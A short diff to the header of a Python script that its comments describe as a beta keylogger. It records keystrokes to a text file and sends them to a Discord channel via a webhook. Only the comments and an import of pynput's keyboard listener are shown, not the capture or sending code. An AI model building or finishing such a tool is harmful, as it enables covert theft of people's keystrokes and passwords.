@@ -1,6 +1,6 @@
 # Simple Keylogger that Logs Keys into a text file and then sends the info to a Discord Text Channel of your Liking via its Webhook.
 # For more Information, check out the READ.ME, or contact Punch7577.
-# NOTE: This is the BETA version of this project. It does not include a GUI. In the future, I will add a GUI to it to make it more interactive. It will likely have a localhost based GUI for users to use it on their web browser.
+# NOTE: This is the BETA version of this project. It does not include a GUI. In the future, I will add a GUI to it to make it more interactive.
 # Until then, enjoy the raw code and tell me what I can improve on.
 
 from pynput.keyboard import Listener
